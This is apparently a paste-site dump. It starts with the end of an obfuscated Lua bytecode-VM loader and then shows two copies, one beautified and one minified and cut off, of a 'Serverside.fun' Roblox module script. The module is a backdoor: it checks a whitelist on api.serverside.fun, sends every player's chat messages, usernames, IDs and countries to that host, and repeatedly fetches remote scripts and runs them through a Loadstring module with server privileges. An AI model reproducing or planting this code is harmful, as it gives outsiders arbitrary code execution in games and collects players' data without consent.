						v34 = (5 - 3) - 1;
					end
				end
			end
			v25 = nil;
			v18 = 4;
		end
		if (v18 == 6) then
			v29 = nil;
			function v29()
				local v39 = 0;
				local v40;
				local v41;
				local v42;
				local v43;
				local v44;
				local v45;
				local v46;
				local v47;
				local v48;
				while true do
					if (v39 == 2) then
						v44 = nil;
						v45 = nil;
						v39 = 3;
					end
					if ((2 - 1) ~= v39) then
					else
						v42 = nil;
						v43 = nil;
						v39 = 2 + 0;
					end
					if (v39 ~= 0) then
					else
						v40 = 0 + 0;
						v41 = nil;
						v39 = 397 - (115 + 281);
					end
					if (v39 == (9 - 5)) then
						v48 = nil;
						while true do
							if (v40 == (4 + 0)) then
								while true do
									if (v41 == 1) then
										local v104 = 0;
										while true do
											if (v104 == 1) then
												v41 = 2;
												break;
											end
											if (v104 == 0) then
												v44 = nil;
												v45 = nil;
												v104 = 1;
											end
										end
									end
									if (v41 == (4 - 2)) then
										v46 = nil;
										v47 = nil;
										v41 = 3;
									end
									if (v41 ~= 0) then
									else
										local v105 = 0;
										while true do
											if (v105 == 1) then
												v41 = 3 - 2;
												break;
											end
											if (v105 == 0) then
												v42 = 867 - (550 + 317);
												v43 = nil;
												v105 = 1 - 0;
											end
										end
									end
									if (v41 ~= (3 - 0)) then
									else
										v48 = nil;
										while true do
											local v106 = 0;
											local v107;
											while true do
												if (v106 ~= (0 - 0)) then
												else
													v107 = 0;
													while true do
														if (1 ~= v107) then
														else
															if (v42 == 2) then
																local v197 = 0;
																local v198;
																local v199;
																while true do
																	if (v197 ~= (285 - (134 + 151))) then
																	else
																		v198 = 0;
																		v199 = nil;
																		v197 = 1;
																	end
																	if (v197 ~= 1) then
																	else
																		while true do
																			if (v198 ~= 0) then
																			else
																				v199 = 0;
																				while true do
																					local v239 = 1665 - (970 + 695);
																					while true do
																						if (v239 ~= (0 - 0)) then
																						else
																							if (v199 == 1) then
																								return v46;
																							end
																							if (v199 ~= (1990 - (582 + 1408))) then
																							else
																								local v247 = 0 - 0;
																								local v248;
																								while true do
																									if (v247 == (0 - 0)) then
																										v248 = 0;
																										while true do
																											if (v248 == (0 - 0)) then
																												local v251 = 0;
																												while true do
																													if (v251 == (1824 - (1195 + 629))) then
																														for v252 = 1 - 0, v24() do
																															local v253 = 241 - (187 + 54);
																															local v254;
																															local v255;
																															local v256;
																															while true do
																																if (v253 == (781 - (162 + 618))) then
																																	v256 = nil;
																																	while true do
																																		if (v254 ~= (1 + 0)) then
																																		else
																																			while true do
																																				if (v255 == 0) then
																																					v256 = v22();
																																					if (v21(v256, 1, 1) ~= 0) then
																																					else
																																						local v260 = 0 + 0;
																																						local v261;
																																						local v262;
																																						local v263;
																																						local v264;
																																						while true do
																																							if (v260 ~= (1 - 0)) then
																																							else
																																								local v265 = 0;
																																								while true do
																																									if (1 == v265) then
																																										v260 = 2 - 0;
																																										break;
																																									end
																																									if (v265 == 0) then
																																										v263 = nil;
																																										v264 = nil;
																																										v265 = 1;
																																									end
																																								end
																																							end
																																							if (v260 ~= 0) then
																																							else
																																								v261 = 0;
																																								v262 = nil;
																																								v260 = 1 + 0;
																																							end
																																							if (v260 == 2) then
																																								while true do
																																									if (v261 == (1639 - (1373 + 263))) then
																																										if (v21(v263, 3, 1003 - (451 + 549)) ~= 1) then
																																										else
																																											v264[4] = v48[v264[2 + 2]];
																																										end
																																										v43[v252] = v264;
																																										break;
																																									end
																																									if (v261 ~= (1 - 0)) then
																																									else
																																										local v267 = 0 - 0;
																																										local v268;
																																										while true do
																																											if (v267 ~= (1384 - (746 + 638))) then
																																											else
																																												v268 = 0 + 0;
																																												while true do
																																													if (v268 ~= (0 - 0)) then
																																													else
																																														local v278 = 341 - (218 + 123);
																																														while true do
																																															if (v278 == (1582 - (1535 + 46))) then
																																																v268 = 1 + 0;
																																																break;
																																															end
																																															if (v278 ~= (0 + 0)) then
																																															else
																																																v264 = {v23(),v23(),nil,nil};
																																																if (v262 == (0 - 0)) then
																																																	local v279 = 1467 - (899 + 568);
																																																	local v280;
																																																	local v281;
																																																	while true do
																																																		if (v279 ~= 1) then
																																																		else
																																																			while true do
																																																				if (v280 == (0 + 0)) then
																																																					v281 = 0;
																																																					while true do
																																																						if (v281 == 0) then
																																																							v264[3] = v23();
																																																							v264[4] = v23();
																																																							break;
																																																						end
																																																					end
																																																					break;
																																																				end
																																																			end
																																																			break;
																																																		end
																																																		if (v279 ~= (0 - 0)) then
																																																		else
																																																			v280 = 603 - (268 + 335);
																																																			v281 = nil;
																																																			v279 = 1;
																																																		end
																																																	end
																																																elseif (v262 == (291 - (60 + 230))) then
																																																	v264[3] = v24();
																																																elseif (v262 == 2) then
																																																	v264[3] = v24() - ((574 - (426 + 146)) ^ 16);
																																																elseif (v262 == (1 + 2)) then
																																																	local v284 = 0;
																																																	local v285;
																																																	local v286;
																																																	while true do
																																																		if (v284 == (1457 - (282 + 1174))) then
																																																			while true do
																																																				if (v285 == 0) then
																																																					v286 = 811 - (569 + 242);
																																																					while true do
																																																						if (v286 ~= 0) then
																																																						else
																																																							v264[3] = v24() - ((5 - 3) ^ 16);
																																																							v264[4] = v23();
																																																							break;
																																																						end
																																																					end
																																																					break;
																																																				end
																																																			end
																																																			break;
																																																		end
																																																		if (0 == v284) then
																																																			local v289 = 0 + 0;
																																																			while true do
																																																				if (v289 == (1025 - (706 + 318))) then
																																																					v284 = 1252 - (721 + 530);
																																																					break;
																																																				end
																																																				if ((1271 - (945 + 326)) == v289) then
																																																					v285 = 0;
																																																					v286 = nil;
																																																					v289 = 2 - 1;
																																																				end
																																																			end
																																																		end
																																																	end
																																																end
																																																v278 = 1;
																																															end
																																														end
																																													end
																																													if (v268 == (1 + 0)) then
																																														v261 = 2;
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																									end
																																									if (v261 == 2) then
																																										local v269 = 700 - (271 + 429);
																																										while true do
																																											if (0 ~= v269) then
																																											else
																																												if (v21(v263, 1 + 0, 1) ~= 1) then
																																												else
																																													v264[1502 - (1408 + 92)] = v48[v264[1088 - (461 + 625)]];
																																												end
																																												if (v21(v263, 1290 - (993 + 295), 1 + 1) == 1) then
																																													v264[1174 - (418 + 753)] = v48[v264[2 + 1]];
																																												end
																																												v269 = 1;
																																											end
																																											if (v269 == 1) then
																																												v261 = 3;
																																												break;
																																											end
																																										end
																																									end
																																									if (v261 == (0 + 0)) then
																																										local v270 = 0;
																																										local v271;
																																										while true do
																																											if (v270 == (0 + 0)) then
																																												v271 = 0;
																																												while true do
																																													if (v271 == (0 + 0)) then
																																														v262 = v21(v256, 531 - (406 + 123), 3);
																																														v263 = v21(v256, 4, 6);
																																														v271 = 1770 - (1749 + 20);
																																													end
																																													if (v271 == 1) then
																																														v261 = 1;
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end
																																					break;
																																				end
																																			end
																																			break;
																																		end
																																		if (v254 == 0) then
																																			local v259 = 0;
																																			while true do
																																				if ((1 + 0) == v259) then
																																					v254 = 1323 - (1249 + 73);
																																					break;
																																				end
																																				if (v259 ~= 0) then
																																				else
																																					v255 = 0 + 0;
																																					v256 = nil;
																																					v259 = 1;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																																if (v253 == 0) then
																																	v254 = 0;
																																	v255 = nil;
																																	v253 = 1;
																																end
																															end
																														end
																														for v257 = 1, v24() do
																															v44[v257 - (1146 - (466 + 679))] = v29();
																														end
																														v251 = 2 - 1;
																													end
																													if (v251 == (2 - 1)) then
																														v248 = 1;
																														break;
																													end
																												end
																											end
																											if (v248 == (1901 - (106 + 1794))) then
																												v199 = 1 + 0;
																												break;
																											end
																										end
																										break;
																									end
																								end
																							end
																							break;
																						end
																					end
																				end
																				break;
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (v107 ~= (0 + 0)) then
														else
															if (v42 == (2 - 1)) then
																local v200 = 0;
																while true do
																	if (v200 == 0) then
																		v47 = v24();
																		v48 = {};
																		v200 = 1;
																	end
																	if (v200 ~= 2) then
																	else
																		v42 = 5 - 3;
																		break;
																	end
																	if (v200 == (115 - (4 + 110))) then
																		local v233 = 584 - (57 + 527);
																		while true do
																			if (v233 == 1) then
																				v200 = 1429 - (41 + 1386);
																				break;
																			end
																			if (v233 == (103 - (17 + 86))) then
																				local v236 = 0;
																				while true do
																					if (v236 == (1 + 0)) then
																						v233 = 1;
																						break;
																					end
																					if (v236 ~= (0 - 0)) then
																					else
																						for v243 = 1, v47 do
																							local v244 = 0 - 0;
																							local v245;
																							local v246;
																							while true do
																								if (v244 == (167 - (122 + 44))) then
																									if (v245 == (1 - 0)) then
																										v246 = v22() ~= (0 - 0);
																									elseif (v245 == 2) then
																										v246 = v25();
																									elseif (v245 == (3 + 0)) then
																										v246 = v26();
																									end
																									v48[v243] = v246;
																									break;
																								end
																								if (v244 == 0) then
																									v245 = v22();
																									v246 = nil;
																									v244 = 1;
																								end
																							end
																						end
																						v46[3] = v22();
																						v236 = 1;
																					end
																				end
																			end
																		end
																	end
																end
															end
															if (0 == v42) then
																local v201 = 0;
																local v202;
																local v203;
																while true do
																	if (v201 ~= 0) then
																	else
																		v202 = 0 + 0;
																		v203 = nil;
																		v201 = 1 - 0;
																	end
																	if (v201 == 1) then
																		while true do
																			if ((65 - (30 + 35)) == v202) then
																				v203 = 0;
																				while true do
																					if ((1 + 0) == v203) then
																						local v241 = 0;
																						while true do
																							if (v241 ~= (1257 - (1043 + 214))) then
																							else
																								local v249 = 0 - 0;
																								while true do
																									if (1 == v249) then
																										v241 = 1213 - (323 + 889);
																										break;
																									end
																									if (v249 == 0) then
																										v45 = {};
																										v46 = {v43,v44,nil,v45};
																										v249 = 1;
																									end
																								end
																							end
																							if (v241 ~= (414 - (15 + 398))) then
																							else
																								v203 = 984 - (18 + 964);
																								break;
																							end
																						end
																					end
																					if (v203 ~= 0) then
																					else
																						local v242 = 0 - 0;
																						while true do
																							if (v242 == (1 + 0)) then
																								v203 = 1 + 0;
																								break;
																							end
																							if (v242 == (850 - (20 + 830))) then
																								v43 = {};
																								v44 = {};
																								v242 = 1 + 0;
																							end
																						end
																					end
																					if (v203 == 2) then
																						v42 = 127 - (116 + 10);
																						break;
																					end
																				end
																				break;
																			end
																		end
																		break;
																	end
																end
															end
															v107 = 1 + 0;
														end
													end
													break;
												end
											end
										end
										break;
									end
								end
								break;
							end
							if (v40 == (740 - (542 + 196))) then
								v45 = nil;
								v46 = nil;
								v40 = 3;
							end
							if (v40 == (0 - 0)) then
								v41 = 0;
								v42 = nil;
								v40 = 1;
							end
							if ((1 + 2) ~= v40) then
							else
								v47 = nil;
								v48 = nil;
								v40 = 4;
							end
							if (v40 == (1 + 0)) then
								local v99 = 0 + 0;
								while true do
									if (v99 == 0) then
										v43 = nil;
										v44 = nil;
										v99 = 2 - 1;
									end
									if (v99 ~= 1) then
									else
										v40 = 4 - 2;
										break;
									end
								end
							end
						end
						break;
					end
					if (v39 ~= (1554 - (1126 + 425))) then
					else
						v46 = nil;
						v47 = nil;
						v39 = 4;
					end
				end
			end
			v30 = nil;
			v18 = 7;
		end
		if (v18 == 4) then
			function v25()
				local v49 = v24();
				local v50 = v24();
				local v51 = 4 - 3;
				local v52 = (v21(v50, 406 - (118 + 287), 78 - 58) * (2 ^ (1153 - (118 + 1003)))) + v49;
				local v53 = v21(v50, 21, 90 - 59);
				local v54 = ((v21(v50, 409 - (142 + 235)) == (754 - (239 + 514))) and -(4 - 3)) or (1 + 0);
				if (v53 == (977 - (553 + 424))) then
					if (v52 == (0 - 0)) then
						return v54 * (0 + 0);
					else
						v53 = 1 + 0 + 0;
						v51 = 0 + 0;
					end
				elseif (v53 == (871 + 1176)) then
					return ((v52 == (0 + 0)) and (v54 * (1 / (0 - 0)))) or (v54 * NaN);
				end
				return v8(v54, v53 - (2849 - (3155 - (797 + 532)))) * (v51 + (v52 / ((4 - 2) ^ (12 + 4 + 36))));
			end
			v26 = nil;
			function v26(v55)
				local v56;
				if not v55 then
					local v76 = 0;
					while true do
						if (v76 == (1202 - (373 + 829))) then
							v55 = v24();
							if (v55 == (0 + 0)) then
								return """";
							end
							break;
						end
					end
				end
				v56 = v3(v16, v19, (v19 + v55) - (2 - 1));
				v19 = v19 + v55;
				local v57 = {};
				for v70 = 1, #v56 do
					v57[v70] = v2(v1(v3(v56, v70, v70)));
				end
				return v6(v57);
			end
			v18 = 5;
		end
		if (v18 == 2) then
			function v22()
				local v58 = 0 + (0 - 0);
				local v59;
				while true do
					if (v58 == (1 - 0)) then
						return v59;
					end
					if (v58 == (0 - 0)) then
						v59 = v1(v16, v19, v19);
						v19 = v19 + (239 - ((400 - (144 + 192)) + 174));
						v58 = 1 + 0;
					end
				end
			end
			v23 = nil;
			function v23()
				local v60, v61 = v1(v16, v19, v19 + (218 - (42 + 174)));
				v19 = v19 + 2 + 0;
				return (v61 * 256) + v60;
			end
			v18 = 3;
		end
		if (v18 == 0) then
			v19 = 1;
			v20 = nil;
			v16 = v4(v3(v16, 5), "".."", function(v62)
				if (v1(v62, 2) == 79) then
					v20 = v0(v3(v62, 1, 1));
					return """";
				else
					local v77 = v2(v0(v62, 16));
					if v20 then
						local v81 = v5(v77, v20);
						v20 = nil;
						return v81;
					else
						return v77;
					end
				end
			end);
			v18 = 1;
		end
		if (v18 == 7) then
			function v30(v63, v64, v65)
				local v66 = 0;
				local v67;
				local v68;
				local v69;
				while true do
					if (v66 == 1) then
						v69 = v63[3];
						return function(...)
							local v82 = v67;
							local v83 = v68;
							local v84 = v69;
							local v85 = v28;
							local v86 = 1;
							local v87 = -1;
							local v88 = {};
							local v89 = {...};
							local v90 = v12(""#"", ...) - 1;
							local v91 = {};
							local v92 = {};
							for v96 = 0, v90 do
								if (v96 >= v84) then
									v88[v96 - v84] = v89[v96 + 1];
								else
									v92[v96] = v89[v96 + 1];
								end
							end
							local v93 = (v90 - v84) + 1;
							local v94;
							local v95;
							while true do
								v94 = v82[v86];
								v95 = v94[1];
								if (v95 <= 23) then
									if (v95 <= 11) then
										if (v95 <= 5) then
											if (v95 <= 2) then
												if (v95 <= 0) then
													local v108 = v94[2];
													local v109, v110 = v85(v92[v108]());
													v87 = (v110 + v108) - 1;
													local v111 = 0;
													for v130 = v108, v87 do
														local v131 = 0;
														while true do
															if (v131 == 0) then
																v111 = v111 + 1;
																v92[v130] = v109[v111];
																break;
															end
														end
													end
												elseif (v95 > 1) then
													local v137 = v94[2];
													local v138 = v94[4];
													local v139 = v137 + 2;
													local v140 = {v92[v137](v92[v137 + 1], v92[v139])};
													for v204 = 1, v138 do
														v92[v139 + v204] = v140[v204];
													end
													local v141 = v140[1];
													if v141 then
														v92[v139] = v141;
														v86 = v94[3];
													else
														v86 = v86 + 1;
													end
												else
													v92[v94[2]]();
												end
											elseif (v95 <= 3) then
												local v112 = 0;
												local v113;
												local v114;
												local v115;
												while true do
													if (v112 == 1) then
														v115 = 0;
														for v219 = v113, v94[4] do
															v115 = v115 + 1;
															v92[v219] = v114[v115];
														end
														break;
													end
													if (v112 == 0) then
														v113 = v94[2];
														v114 = {v92[v113](v92[v113 + 1])};
														v112 = 1;
													end
												end
											elseif (v95 > 4) then
												local v142 = 0;
												local v143;
												while true do
													if (v142 == 0) then
														v143 = v94[2];
														v92[v143](v92[v143 + 1]);
														break;
													end
												end
											else
												local v144 = v94[2];
												v92[v144] = v92[v144](v13(v92, v144 + 1, v87));
											end
										elseif (v95 <= 8) then
											if (v95 <= 6) then
												for v132 = v94[2], v94[3] do
													v92[v132] = nil;
												end
											elseif (v95 > 7) then
												v92[v94[2]]();
											else
												local v146 = v94[2];
												v92[v146] = v92[v146](v92[v146 + 1]);
											end
										elseif (v95 <= 9) then
											local v116 = v94[2];
											local v117 = {v92[v116](v92[v116 + 1])};
											local v118 = 0;
											for v134 = v116, v94[4] do
												v118 = v118 + 1;
												v92[v134] = v117[v118];
											end
										elseif (v95 == 10) then
											local v148 = v94[2];
											v92[v148] = v92[v148]();
										else
											local v150 = 0;
											local v151;
											while true do
												if (v150 == 0) then
													v151 = v94[2];
													v92[v151] = v92[v151](v92[v151 + 1]);
													break;
												end
											end
										end
									elseif (v95 <= 17) then
										if (v95 <= 14) then
											if (v95 <= 12) then
												if ((v94[3] == ""_ENV"") or (v94[3] == ""getfenv"")) then
													v92[v94[2]] = v65;
												else
													v92[v94[2]] = v65[v94[3]];
												end
											elseif (v95 > 13) then
												local v155 = v94[2];
												v92[v155](v13(v92, v155 + 1, v94[3]));
											elseif ((v94[3] == ""_ENV"") or (v94[3] == ""getfenv"")) then
												v92[v94[2]] = v65;
											else
												v92[v94[2]] = v65[v94[3]];
											end
										elseif (v95 <= 15) then
											v92[v94[2]] = v94[3];
										elseif (v95 > 16) then
											v92[v94[2]] = v92[v94[3]][v92[v94[4]]];
										else
											v92[v94[2]] = v92[v94[3]] + v94[4];
										end
									elseif (v95 <= 20) then
										if (v95 <= 18) then
											v92[v94[2]] = v92[v94[3]] - v94[4];
										elseif (v95 > 19) then
											v92[v94[2]][v94[3]] = v94[4];
										else
											v92[v94[2]][v94[3]] = v92[v94[4]];
										end
									elseif (v95 <= 21) then
										if (v94[2] == v92[v94[4]]) then
											v86 = v86 + 1;
										else
											v86 = v94[3];
										end
									elseif (v95 > 22) then
										for v208 = v94[2], v94[3] do
											v92[v208] = nil;
										end
									else
										local v164 = 0;
										local v165;
										local v166;
										local v167;
										local v168;
										while true do
											if (v164 == 0) then
												v165 = v94[2];
												v166, v167 = v85(v92[v165]());
												v164 = 1;
											end
											if (v164 == 2) then
												for v234 = v165, v87 do
													local v235 = 0;
													while true do
														if (0 == v235) then
															v168 = v168 + 1;
															v92[v234] = v166[v168];
															break;
														end
													end
												end
												break;
											end
											if (v164 == 1) then
												v87 = (v167 + v165) - 1;
												v168 = 0;
												v164 = 2;
											end
										end
									end
								elseif (v95 <= 35) then
									if (v95 <= 29) then
										if (v95 <= 26) then
											if (v95 <= 24) then
												if (v94[2] == v92[v94[4]]) then
													v86 = v86 + 1;
												else
													v86 = v94[3];
												end
											elseif (v95 > 25) then
												v92[v94[2]] = v92[v94[3]][v94[4]];
											elseif (v92[v94[2]] == v94[4]) then
												v86 = v86 + 1;
											else
												v86 = v94[3];
											end
										elseif (v95 <= 27) then
											v92[v94[2]] = v92[v94[3]][v94[4]];
										elseif (v95 == 28) then
											local v172 = v94[2];
											v92[v172](v92[v172 + 1]);
										else
											v92[v94[2]] = v92[v94[3]];
										end
									elseif (v95 <= 32) then
										if (v95 <= 30) then
											do
												return;
											end
										elseif (v95 > 31) then
											v92[v94[2]] = v94[3];
										else
											local v177 = v94[2];
											v92[v177](v13(v92, v177 + 1, v94[3]));
										end
									elseif (v95 <= 33) then
										v86 = v94[3];
									elseif (v95 > 34) then
										v65[v94[3]] = v92[v94[2]];
									else
										local v180 = v94[2];
										local v181 = v94[4];
										local v182 = v180 + 2;
										local v183 = {v92[v180](v92[v180 + 1], v92[v182])};
										for v210 = 1, v181 do
											v92[v182 + v210] = v183[v210];
										end
										local v184 = v183[1];
										if v184 then
											v92[v182] = v184;
											v86 = v94[3];
										else
											v86 = v86 + 1;
										end
									end
								elseif (v95 <= 41) then
									if (v95 <= 38) then
										if (v95 <= 36) then
											do
												return;
											end
										elseif (v95 > 37) then
											v92[v94[2]][v94[3]] = v92[v94[4]];
										else
											local v187 = v94[2];
											v92[v187] = v92[v187](v13(v92, v187 + 1, v87));
										end
									elseif (v95 <= 39) then
										local v125 = 0;
										local v126;
										while true do
											if (v125 == 0) then
												v126 = v94[2];
												v92[v126] = v92[v126]();
												break;
											end
										end
									elseif (v95 == 40) then
										v92[v94[2]] = v92[v94[3]];
									else
										v92[v94[2]][v94[3]] = v94[4];
									end
								elseif (v95 <= 44) then
									if (v95 <= 42) then
										v86 = v94[3];
									elseif (v95 == 43) then
										if (v92[v94[2]] == v94[4]) then
											v86 = v86 + 1;
										else
											v86 = v94[3];
										end
									else
										v65[v94[3]] = v92[v94[2]];
									end
								elseif (v95 <= 45) then
									v92[v94[2]] = v92[v94[3]][v92[v94[4]]];
								elseif (v95 == 46) then
									v92[v94[2]] = v92[v94[3]] + v94[4];
								else
									v92[v94[2]] = v92[v94[3]] - v94[4];
								end
								v86 = v86 + 1;
							end
						end;
					end
					if (v66 == 0) then
						v67 = v63[1];
						v68 = v63[2];
						v66 = 1;
					end
				end
			end
			return v30(v29(), {}, v17)(...);
		end
	end
end
vv9(), ...);
"
ZMjMyUhZ,Serverside.fun Beautified Module Script,darraghd493,Lua,Sunday 7th of January 2024 02:17:34 PM CDT,"--[[
IDs in this script:
- 13749573698 - Watermark
- 3436957371 - R6
]]

local GET_PLAYERS_URL = ""https://api.serverside.fun/v1/get-players""
local WATERMARK_ID = 13749573698

local LocalisationService = game:GetService(""LocalizationService"")
local HttpService = game:GetService(""HttpService"")
local Players = game:GetService(""Players"")

local Module = {}

Players.PlayerAdded:Connect(function(player)
		pcall(function()
			local response = HttpService:GetAsync(""https://api.serverside.fun/v1/check-whitelist/"" .. player.UserId .. ""/"" .. game.GameId)
			local user_data = HttpService:JSONDecode(response)
			
			if user_data.whitelisted ~= false then
				pcall(function()
					player.Chatted:Connect(function(message)
						pcall(function()
							HttpService:PostAsync(""https://api.serverside.fun/v1/chat"", HttpService:JSONEncode({
								[""text""] = tostring(message),
								[""robloxId""] = tostring(player.UserId),
								[""placeId""] = tostring(game.PlaceId)
							}))
						end)
					end)
				end)

				if user_data.watermark then
					if user_data.watermark == true then
						pcall(function()
							require(WATERMARK_ID).hi(player.Name)
						end)
					end
				end

				local function getPlayerData()
					local playerData = {}

					for i, v in ipairs(Players:GetPlayers()) do
						local country = ""Unknown""
						
						pcall(function()
							country = LocalisationService:GetCountryRegionForPlayerAsync(v)
						end)

						table.insert(playerData, {username = v.Name, userid = v.UserId, displayName = v.DisplayName, country = country})
					end
					
					return playerData
				end

				local function postPlayerData()
					task.wait(0.5)
					if Players:FindFirstChild(player.Name) then
						HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = getPlayerData(), robloxId = player.UserId}))
					end
				end

				local posted_removing_1 = true
				local posted_removing_2 = false
				
				local function postPlayerRemovingData()
					task.wait(1)

					if Players:FindFirstChild(player.Name) and posted_removing_1 == true then
						postPlayerData()
					else
						posted_removing_1 = false
						if posted_removing_2 == false then
							HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = {}, robloxId = player.UserId}))
							posted_removing_2 = true
						end
					end
				end
				
				pcall(function()
					postPlayerData()
					Players.PlayerAdded:Connect(postPlayerData)
					Players.PlayerRemoving:Connect(postPlayerRemovingData)
				end)

				-- Premium script polling
				if user_data.type ~= ""NORMAL"" then
					pcall(function()
						local premium_script_poll_data = HttpService:JSONDecode(HttpService:GetAsync(""https://api.serverside.fun/v1/private-scripts/"" .. player.UserId))
						for i, v in ipairs(premium_script_poll_data.scripts) do
							pcall(function()
								if v == ""r6()"" then
									pcall(function()
										require(3436957371):r6(player.Name)
									end)
								elseif v == ""re()"" then
									pcall(function()
										player:LoadCharacter()
									end)
								elseif v:match(""USERNAME"") then
									pcall(function()
										require(script.Loadstring)(string.gsub(v, ""USERNAME"", player.Name))()
									end)
								else
									pcall(function()
										require(script.Loadstring)(v)()
									end)
								end
							end)
						end
					end)
				end

				-- Normal script polling
				local script_poll_url = ""https://api.serverside.fun/v1/long-polling/kkwAhfSFRnAyAoffQYNEEviBUAVs/"" .. player.UserId
				while true do
					local success, error = pcall(HttpService.GetAsync, HttpService, script_poll_url)
					if success then
						local success_2, error_2 = pcall(HttpService.JSONDecode, HttpService, error)
						if success_2 then
							if error_2 and error_2[""script""] then
								if Players:FindFirstChild(player.Name) then
									local polled_script = error_2[""script""].script
									if player.UserId == tonumber(error_2[""script""].robloxId) then
										if polled_script == ""r6()"" then
											pcall(function()
												require(3436957371):r6(player.Name)
											end)
										elseif polled_script == ""re()"" then
											pcall(function()
												player:LoadCharacter()
											end)
										elseif polled_script:match(""USERNAME"") then
											pcall(function()
												require(script.Loadstring)(string.gsub(polled_script, ""USERNAME"", player.Name))()
											end)
										else
											pcall(function()
												require(script.Loadstring)(polled_script)()
											end)
										end

										pcall(function()
											HttpService:PostAsync(""https://api.serverside.fun/v1/script-logs"", HttpService:JSONEncode({
												[""script""] = polled_script,
												[""robloxId""] = tostring(player.UserId),
												[""gameId""] = tostring(game.GameId)
											}))
										end)
									end
								end
							end
						end
					end
					task.wait()
				end
			end
		end)

		-- Free script polling
		pcall(
			function()
			local free_user_data = HttpService:JSONDecode(HttpService:GetAsync(""https://api.serverside.fun/v1/toggle-free/check/"" .. player.UserId))
			if free_user_data.whitelisted ~= false then
				local function getPlayerData()
					local playerData = {}

					for i, v in ipairs(Players:GetPlayers()) do
						local country = ""Unknown""
						
						pcall(function()
							country = LocalisationService:GetCountryRegionForPlayerAsync(v)
						end)

						table.insert(playerData, {username = v.Name, userid = v.UserId, displayName = v.DisplayName, country = country})
					end
					
					return playerData
				end

				local function postPlayerData()
					task.wait(0.5)
					if Players:FindFirstChild(player.Name) then
						HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = getPlayerData(), robloxId = player.UserId}))
					end
				end

				local posted_removing_1 = true
				local posted_removing_2 = false

				local function postPlayerRemovingData()
					task.wait(1)

					if Players:FindFirstChild(player.Name) and posted_removing_1 == true then
						postPlayerData()
					else
						posted_removing_1 = false
						if posted_removing_2 == false then
							HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = {}, robloxId = player.UserId}))
							posted_removing_2 = true
						end
					end
				end

				pcall(function()
					postPlayerData()
					Players.PlayerAdded:Connect(postPlayerData)
					Players.PlayerRemoving:Connect(postPlayerRemovingData)
				end)

				pcall(function()
					require(WATERMARK_ID).hi(player.Name)
				end)

				-- Free script polling
				while true do
					task.wait(1)
					if Players:FindFirstChild(player.Name) then
						local script_poll_data = HttpService:JSONDecode(HttpService:GetAsync(""https://api.serverside.fun/v1/pending-script/"" .. player.UserId))
						local pending_scripts = script_poll_data.pendingScripts
						
						for i, v in pairs(pending_scripts) do
							if v.script == ""r6()"" then
								pcall(function()
									require(3436957371):r6(player.Name)
								end)
							elseif v.script == ""re()"" then
								pcall(function()
									player:LoadCharacter()
								end)
							elseif v.script:match(""USERNAME"") then
								local z = string.gsub(v.script, ""USERNAME"", player.Name)
								pcall(function()
									require(script.Loadstring)(z)()
								end)
							else
								pcall(function()
									require(script.Loadstring)(v.script)()
								end)
							end
						end
					end
				end
			else
			end
		end)
	end
)

Players.PlayerAdded:Connect(function(player)
	pcall(function()
		HttpService:PostAsync(""https://api.serverside.fun/v1/games"", HttpService:JSONEncode({[""jobId""] = tostring(game.JobId), [""universe""] = tostring(game.GameId)}))
	end)
end)

return Module
"
HhLhY8N3,Serverside.fun Module Script,darraghd493,Lua,Sunday 7th of January 2024 02:16:37 PM CDT,"local a = {}
local b = ""https://api.serverside.fun/v1/get-players""
local c = game:GetService(""LocalizationService"")
local d = game:GetService(""HttpService"")
local e = game:GetService(""Players"")
game:GetService(""Players"").PlayerAdded:Connect(
    function(f)
        pcall(
            function()
                local g =
                    game:GetService(""HttpService""):GetAsync(
                    ""https://api.serverside.fun/v1/check-whitelist/"" .. f.UserId .. ""/"" .. game.GameId
                )
                local h = game:GetService(""HttpService""):JSONDecode(g)
                if h.whitelisted ~= false then
                    pcall(
                        function()
                            local d = game:GetService(""HttpService"")
                            local i = ""https://api.serverside.fun/v1/chat""
                            f.Chatted:Connect(
                                function(j)
                                    local h = {
                                        [""text""] = tostring(j),
                                        [""robloxId""] = tostring(f.UserId),
                                        [""placeId""] = tostring(game.PlaceId)
                                    }
                                    pcall(
                                        function()
                                            d:PostAsync(i, d:JSONEncode(h))
                                        end
                                    )
                                end
                            )
                        end
                    )
                    if h.watermark then
                        if h.watermark == true then
                            pcall(
                                function()
                                    require(13749573698).hi(f.Name)
                                end
                            )
                        end
                    end
                    local function k()
                        local l = {}
                        for m, n in ipairs(game.Players:GetPlayers()) do
                            local o
                            pcall(
                                function()
                                    o = c:GetCountryRegionForPlayerAsync(n)
                                end
                            )
                            if not o then
                                o = ""Unknown""
                            end
                            table.insert(
                                l,
                                {username = n.Name, userid = n.UserId, displayName = n.DisplayName, country = o}
                            )
                        end
                        return l
                    end
                    local function p()
                        wait(.5)
                        if game.Players:FindFirstChild(f.Name) then
                            local l = k()
                            local q = {value = l, robloxId = f.UserId}
                            local r = d:JSONEncode(q)
                            d:PostAsync(b, r)
                        end
                    end
                    local s = true
                    local t = false
                    local function u()
                        wait(1)
                        if game.Players:FindFirstChild(f.Name) and s == true then
                            p()
                        else
                            s = false
                            if t == false then
                                local v = {value = {}, robloxId = f.UserId}
                                local w = d:JSONEncode(v)
                                d:PostAsync(b, w)
                                t = true
                            end
                        end
                    end
                    pcall(
                        function()
                            p()
                            game.Players.PlayerAdded:Connect(p)
                            game.Players.PlayerRemoving:Connect(u)
                        end
                    )
                    if h.type ~= ""NORMAL"" then
                        pcall(
                            function()
                                local g =
                                    game:GetService(""HttpService""):GetAsync(
                                    ""https://api.serverside.fun/v1/private-scripts/"" .. f.UserId
                                )
                                local h = game:GetService(""HttpService""):JSONDecode(g)
                                for x, y in ipairs(h.scripts) do
                                    pcall(
                                        function()
                                            if y == ""r6()"" then
                                                pcall(
                                                    function()
                                                        require(3436957371):r6(f.Name)
                                                    end
                                                )
                                            elseif y == ""re()"" then
                                                pcall(
                                                    function()
                                                        f:LoadCharacter()
                                                    end
                                                )
                                            elseif y:match(""USERNAME"") then
                                                local z = string.gsub(y, ""USERNAME"", f.Name)
                                                pcall(
                                                    function()
                                                        require(script.Loadstring)(z)()
                                                    end
                                                )
